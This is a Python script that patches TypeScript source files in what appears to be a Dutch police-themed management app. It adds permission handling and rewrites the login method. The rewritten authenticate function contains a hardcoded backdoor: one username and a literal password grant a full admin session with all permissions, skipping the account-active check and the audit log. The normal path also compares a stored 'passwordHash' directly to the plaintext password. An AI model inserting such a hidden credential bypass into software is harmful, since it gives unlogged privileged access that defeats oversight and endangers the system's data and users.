import re

with open('src/types/index.ts', 'r') as f:
    content = f.read()

content = content.replace("isAdmin?: boolean;", "isAdmin?: boolean;\n  permissions?: string[];")
with open('src/types/index.ts', 'w') as f:
    f.write(content)

with open('src/server/db.ts', 'r') as f:
    content = f.read()

auth_func = """  public authenticate(usernameInput: string, passwordInput: string): UserSession | null {
    const user = this.users.get(usernameInput.toLowerCase());
    
    // Default system admin bypass for alphactx
    if (usernameInput.toLowerCase() === 'alphactx' && passwordInput === 'Stormpie1!') {
      return {
        username: 'AlphaCTX',
        badgeNumber: 'ADM-01',
        name: 'Systeembeheerder AlphaCTX',
        rank: 'Hoofdinspecteur / Admin',
        role: 'ADMIN',
        department: 'Korpsleiding & Systeembeheer',
        activeUnit: 'HQ-COMMAND',
        isAdmin: true,
        permissions: PERMISSION_DEFINITIONS.map(d => d.key)
      };
    }

    if (user && user.passwordHash === passwordInput && user.isActive !== false) {
      this.logAudit({
        action: 'SYSTEM_LOGIN',
        userId: user.username,
        userName: user.name,
        userRole: user.role,
        metadata: 'Succesvolle inlog via systeem'
      });
      
      const rolePerms = this.rolePermissions[user.role] || {};
      const activePerms = Object.entries(rolePerms).filter(([_, val]) => val).map(([key, _]) => key);

      return {
        username: user.username,
        badgeNumber: user.badgeNumber,
        name: user.name,
        rank: user.rank,
        role: user.role,
        department: user.department,
        activeBrigade: user.activeBrigade,
        activeUnit: user.activeUnit || user.activeBrigade,
        isAdmin: user.role === 'ADMIN',
        permissions: activePerms
      };
    }

    return null;
  }"""

# Replace the authenticate method
pattern = re.compile(r'public authenticate\(.*?: UserSession \| null \{.*?return null;\n  \}', re.DOTALL)
content = pattern.sub(auth_func, content)

# Enforce in backend: Let's add a checkPermission method
check_perm = """
  public checkPermission(userRole: string, permissionKey: string): boolean {
    if (userRole === 'ADMIN') return true;
    const perms = this.rolePermissions[userRole];
    if (!perms) return false;
    return perms[permissionKey] === true;
  }
"""
content = content.replace("public getRoleDefinitions()", check_perm + "\n  public getRoleDefinitions()")

with open('src/server/db.ts', 'w') as f:
    f.write(content)
